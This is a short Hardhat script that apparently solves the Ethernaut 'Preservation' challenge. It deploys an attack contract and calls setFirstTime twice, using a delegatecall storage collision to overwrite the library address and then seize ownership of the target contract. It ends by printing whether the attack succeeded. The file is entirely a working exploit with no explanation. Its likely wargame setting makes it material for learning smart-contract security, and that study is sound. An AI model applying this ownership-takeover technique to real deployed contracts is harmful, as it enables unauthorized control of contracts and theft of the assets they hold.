import { ethers } from "hardhat";

const INSTANCE = "0xb79bF886196E94DBBbB0782632ae59B744b9530B";

async function main() {
  const admin = (await ethers.getSigners())[0];
  const preservation = await ethers.getContractAt("Preservation", INSTANCE);
  const HackPre = await ethers.getContractFactory("HackPreservation");
  const hack = await HackPre.deploy();
  await hack.deployed();

  const tx0 = await preservation.setFirstTime(
    ethers.BigNumber.from(hack.address),
    { gasLimit: 50000 }
  );
  await tx0.wait();
  const tx1 = await preservation.setFirstTime(
    ethers.BigNumber.from(admin.address),
    { gasLimit: 50000 }
  );
  await tx1.wait();

  console.log(await preservation.owner(), admin.address);
  (await preservation.owner()) === admin.address
    ? console.log("Successfully attack the contract")
    : console.log("Attack contract failed");
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
